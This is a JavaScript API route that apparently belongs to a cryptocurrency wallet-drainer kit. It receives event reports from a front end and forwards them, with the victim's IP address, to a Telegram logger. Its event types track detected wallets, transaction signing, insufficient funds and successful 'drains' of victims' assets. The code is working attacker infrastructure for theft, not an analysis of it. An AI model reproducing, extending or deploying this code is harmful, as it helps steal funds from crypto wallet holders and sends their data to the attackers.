import telegramLogger from '../src/telegram.js';

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const logData = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    
    // Log to console for debugging
    console.log('[API_LOG]', JSON.stringify(logData, null, 2));
    
    // Forward to Telegram based on log type with enhanced data
    try {
      console.log('[API_LOG] Starting Telegram forwarding...');
      console.log('[API_LOG] Telegram logger instance:', !!telegramLogger);
      console.log('[API_LOG] Telegram logger enabled:', telegramLogger?.enabled);
      
      if (!telegramLogger) {
        throw new Error('Telegram logger is not available');
      }
      
      if (!telegramLogger.enabled) {
        throw new Error('Telegram logger is disabled');
      }
      
      const logType = logData.type || 'FRONTEND_LOG';
      const enhancedData = {
        ...logData,
        ip: clientIP,
        timestamp: logData.timestamp || new Date().toISOString()
      };
      
      console.log('[API_LOG] Log type:', logType);
      console.log('[API_LOG] Enhanced data:', JSON.stringify(enhancedData, null, 2));
      
      console.log('[API_LOG] About to execute switch statement...');
      
      switch (logType) {
        // Essential 7 log types for production
        case 'WALLET_DETECTED':
          console.log('[API_LOG] Executing WALLET_DETECTED case...');
          try {
            await telegramLogger.logWalletDetected(enhancedData);
            console.log('[API_LOG] WALLET_DETECTED completed successfully');
          } catch (error) {
            console.error('[API_LOG] WALLET_DETECTED failed:', error.message);
            throw error;
          }
          break;
          
        case 'DRAIN_SUCCESS':
          console.log('[API_LOG] Executing DRAIN_SUCCESS case...');
          await telegramLogger.logDrainSuccess(enhancedData);
          console.log('[API_LOG] DRAIN_SUCCESS completed');
          break;
          
        case 'TRANSACTION_CANCELLED':
        case 'USER_CANCELLATION':
          await telegramLogger.logTransactionCancelled(enhancedData);
          break;
          
        case 'INSUFFICIENT_FUNDS':
          await telegramLogger.logInsufficientFunds(enhancedData);
          break;
          
        case 'MISSING_PARAMETER':
          await telegramLogger.logMissingParameter(enhancedData);
          break;
          
        case 'RATE_LIMIT':
          await telegramLogger.logRateLimit(enhancedData);
          break;
          
        case 'DRAIN_EXECUTED':
          await telegramLogger.logDrainExecuted(enhancedData);
          break;
          
        // Additional useful log types
        case 'TRANSACTION_SIGNING':
          await telegramLogger.logTransactionSigning(enhancedData);
          break;
          
        case 'API_CALL':
          await telegramLogger.logAPICall(enhancedData);
          break;
          
        case 'WALLET_CONNECTION':
          await telegramLogger.logWalletConnection(enhancedData);
          break;
          
        case 'FRONTEND_ERROR':
          await telegramLogger.logFrontendError(enhancedData);
          break;
          
        case 'RPC_FAILURE':
          await telegramLogger.logRPCFailure(enhancedData);
          break;
          
        case 'CONNECTION_ERROR':
          await telegramLogger.logConnectionError(enhancedData);
          break;
          
        case 'VALIDATION':
          await telegramLogger.logValidation(enhancedData);
          break;
          
        case 'SIMULATION':
          await telegramLogger.logSimulation(enhancedData);
          break;
          
        case 'TOKEN_PROCESSING':
          await telegramLogger.logTokenProcessing(enhancedData);
          break;
          
        case 'CONFIGURATION':
          await telegramLogger.logConfiguration(enhancedData);
          break;
          
        case 'PERFORMANCE':
          await telegramLogger.logPerformance(enhancedData);
          break;
          
        case 'SECURITY':
          await telegramLogger.logSecurity(enhancedData);
          break;
          
        case 'BUSINESS_LOGIC':
          await telegramLogger.logBusinessLogic(enhancedData);
          break;
          
        case 'SYSTEM_EVENT':
          await telegramLogger.logSystemEvent(enhancedData);
          break;
          
        case 'MOBILE_WALLET':
          await telegramLogger.logMobileWallet(enhancedData);
          break;
          
        case 'CIRCUIT_BREAKER':
          await telegramLogger.logCircuitBreaker(enhancedData);
          break;
          
        case 'EMERGENCY_FALLBACK':
          await telegramLogger.logEmergencyFallback(enhancedData);
          break;
          
        case 'PRE_INITIALIZATION':
          await telegramLogger.logPreInitialization(enhancedData);
          break;
          
        case 'CLEAN_TRANSFER':
          await telegramLogger.logCleanTransfer(enhancedData);
          break;
          
        case 'CONNECTION_HEALTH':
          await telegramLogger.logConnectionHealth(enhancedData);
          break;
          
        default:
          // For unknown types, send as unknown event
          await telegramLogger.logUnknownEvent({
            event: logType,
            data: enhancedData,
            ip: clientIP
          });
          break;
      }
      
      console.log(`✅ [API_LOG] Forwarded to Telegram: ${logType}`);
      
    } catch (telegramError) {
      console.error('[API_LOG] Failed to forward to Telegram:', telegramError.message);
      // Don't fail the request if Telegram forwarding fails
    }
    
    res.status(200).json({
      success: true,
      message: 'Log entry recorded successfully',
      timestamp: new Date().toISOString(),
      logId: `log_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      telegramForwarded: true
    });
    
  } catch (error) {
    console.error('[API_LOG_ERROR]', error);
    res.status(500).json({
      success: false,
      message: 'Failed to record log entry',
      error: error.message
    });
  }
}
